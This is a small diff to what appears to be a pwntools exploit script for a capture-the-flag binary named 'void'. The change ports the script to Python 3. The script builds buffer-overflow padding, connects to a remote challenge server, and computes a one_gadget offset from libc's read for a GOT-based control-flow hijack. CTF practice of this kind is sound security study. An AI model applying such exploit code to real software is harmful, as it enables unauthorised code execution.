@@ -8,7 +8,7 @@ offset = 72
 elf = ELF('./void')
 libc = ELF('./glibc/libc.so.6') 
 
-padding = offset*'A'
+padding = offset*b'A'
 
 ip, port='161.35.168.118', 30070
 io = remote(ip,port)
@@ -40,8 +40,8 @@ constraints:
 one_gadget = 0xc961a
 offset = one_gadget - libc.sym['read']
 
-#print offset
 offset = 2**32 + offset
+print(hex(offset))
 
 read_got = elf.got['read']
 read_plt = elf.sym['read']
